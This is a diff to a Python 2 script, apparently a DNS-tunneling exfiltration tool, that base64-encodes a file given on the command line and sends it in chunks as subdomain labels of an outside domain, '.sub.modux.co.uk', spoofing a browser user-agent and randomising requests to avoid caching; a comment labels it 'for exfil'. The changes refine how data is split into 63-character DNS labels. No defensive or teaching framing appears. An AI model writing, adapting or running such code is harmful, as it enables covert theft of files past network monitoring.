@@ -1,5 +1,5 @@
 import requests, base64, StringIO
-import os,binascii,sys,time
+import os,binascii,sys,time,re
 
 
 #http_proxy="http://40.115.115.11:3128"
@@ -11,10 +11,15 @@ filename = sys.argv[1]
 #create random ID for transaction to prevent caching
 ran= binascii.b2a_hex(os.urandom(2))
 
+maxdomain=253
 rootdomain=".sub.modux.co.uk"
-headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36'}
+numblocks=3
+# represents 57 bytes after base64 - max is 63
+subdomainsize=35
+chunksize=numblocks*subdomainsize
 
-chunksize=35
+
+headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36'}
 
 def decoder(base64array):
     filedecode=''
@@ -35,7 +40,10 @@ def padstring(chunk, chunksize):
 
 def sendrequest(string, count):
     # add random string at beginning to ensure query gets relayed
-    print "sending " + string
+    
+    #split long strings into subdomains of 63 (max size)
+    string='.'.join(re.findall(r'.{1,63}', string))
+    
     count=str(count)
     string=string.replace('=', '-')
     try:
@@ -53,9 +61,10 @@ def sendFile(instr):
     # send start request
     print 'send start'
     print 'dns tunneling is slow, make a cup of tea or three...'
-    count=1
+    count=0
     
-    sendrequest('startoffile.'+filename, count)
+    # add domain splitter 2e0o2e
+    sendrequest('startoffile.'+filename+'.2e0o2e', count)
     
         
     time.sleep(2)
@@ -84,12 +93,14 @@ def sendFile(instr):
 
     sendrequest('endoffile', count)
 
-    count=1
+    count=0
         
    # decoder(fullarray)
 ## for testing encoding function  
 file = open(filename, "rb")
+filesize=os.path.getsize(filename)
 
-sendFile(file)
+
+sendFile(file, filesize)
 # for exfil - send request but don't wait for response
 
